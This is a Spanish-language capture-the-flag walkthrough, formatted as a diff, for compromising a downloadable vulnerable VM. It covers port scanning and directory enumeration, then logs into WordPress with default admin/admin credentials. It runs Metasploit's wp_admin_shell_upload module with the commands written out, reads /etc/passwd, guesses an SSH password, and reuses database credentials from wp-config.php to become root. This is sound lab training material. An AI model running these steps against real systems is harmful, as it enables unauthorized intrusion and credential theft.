@@ -1,0 +1,62 @@
+En primer lugar descargamos la máquina virtual de:
+<LINKKKKKKKK>
+
+Al iniciarla ya nos dice la ip, procedemos a realizar un escaneo de puertos:
+
+#nmap -A <ip>
+
+Tarda un poco, tiene muchos puertos abiertos (1)
+Vemos un puerto 80, accedamos con firefox a ver que vemos, foto de un planeta, dice que clikemos, antes analicemos código fuente (Ctrl+U), dos fotos, descargamos y analizamos metadatos.
+
+#exiftool <foto>
+
+Ejecutamos Dirb a ver que vemos
+
+# dirb http://<ip>
+
+Muchisimos ficheros de wordpress.
+
+Nada que destacar
+Recordamos que en el nmap hemos descubierto que tiene un archivo robots.txt, accedemos, nos desvela que tiene wordpress, accedemos, probamos suerte:
+Usr: admin
+Pwd: admin
+Pura suerte (ya es hora de cambiar eso no? xd)
+
+Despues de googlear un rato encontramos en exploit en metasploit llamado wp_admin_shell_upload
+
+# msfconsole
+# use exploit/unix/webapp/wp_admin_shell_upload
+# set PASSWORD admin
+# set USERNAME admin
+# set RHOST <ip>
+# set TARGETURI /wordpress/
+# exploit
+
+Ahora obetenmos el meterpreter: utilizadmos pwd para ver donde nos encontramos (2)
+Sabemos que estamos en linux, por tanto vamos a ver que usuarios tiene:
+
+#cat /etc/passwd
+
+Vemos que el único usuario aparte del root es wpadmin (3), vamos a probar a acceder a el mediante ssh.
+
+#ssh wpadmin@<ip>
+
+Nos pide contraseña, probamos con wpadmin (por seguir con la suerte de arriba). ¡Tenemos acceso ssh!
+Encontramos la primera flag en el home (4), ahora necesitamos acceso root.
+
+Para conseguirlo primero vamos a ver los directorios de wordpress (ya que todo vino de ahi) a ver que encontramos. Recuerdo que Dirb nos dio muchas pistas, busquemos.
+
+Tras rebuscar un rato encontramos lo siguiente: hay un fichero wp-config.php con los datos de la conexion a la base de datos, tiene datos en texto plano, unos de los datos son:
+
+user: root
+password: rootpassword!
+
+Soy un tanto esceptico a que sean las contraseñas del ssh, pero probamos
+
+# ssh root@<ip>
+
+Vale, es la contraseña, somos root
+
+Encontramos la flag en el directorio.
+
+# cat flag.txt
